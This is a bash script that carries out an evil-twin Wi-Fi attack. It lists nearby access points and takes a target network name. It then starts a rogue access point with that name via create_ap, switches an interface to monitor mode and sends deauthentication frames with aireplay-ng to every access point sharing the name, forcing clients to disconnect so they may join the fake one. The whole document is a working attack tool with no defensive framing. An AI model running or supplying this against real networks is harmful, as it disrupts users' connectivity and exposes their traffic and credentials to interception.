#!/bin/bash
echo "Enter interface for monitoring/injection"
read interface_deauth
echo "Enter interface for rogue AP"
read interface_ap
echo "Enter faceing interface"
read interface_faceing

#shows a list of the neighbooring AP's
iwlist ${interface_faceing} scan | grep "ESSID"

echo "Enter the ESSID of the target AP"
read essid

#stores in an array information about AP's with the given ESSID (MAC Address, channel, ESSID) 
array=( $(sudo iwlist wlp4s0 scan | grep "Address\|Channel:\|ESSID:" | grep -B 2 "${essid}") )

#variable used keep track of the index of the array
count=0

echo "Do you really want to attack ${essid} Yes/No ?"
read response

if [ $response = Yes ]
then
	echo "Attack launched"

	#a rogue AP with the target ESSID is created
	create_ap ${interface_ap} ${interface_faceing} ${essid}
	sleep 5s

	#puts the deauthing interface into monitor mode, necessary for injecting dauthentication frames
	ifconfig ${interface_deauth} down
        iwconfig ${interface_deauth} mode monitor
	ifconfig ${interface_deauth} up

	#a deauthentication attack is launched against every AP with the target ESSID
	for i in "${array[@]}"
	do
		#these magic constants (%8, -eq 4) are designed to extract the required information from the grep output
		if [ $(($count%8)) -eq 4 ]
		then
			#stores the target AP's MAC address
			address=$i
		fi
		if [ $(($count%8)) -eq 5 ]
		then
			#stores the target AP0s channel
			channel="${i//[!0-9]/}"

			#switches the channel of the deauthing interface to the target AP's channel
			iwconfig ${interface_deauth} channel ${channel}

			#deauthenticate users connected to the target AP
			(aireplay-ng -0 15 -a ${address} ${interface_deauth}) &
		fi
		((++count))
	done
fi



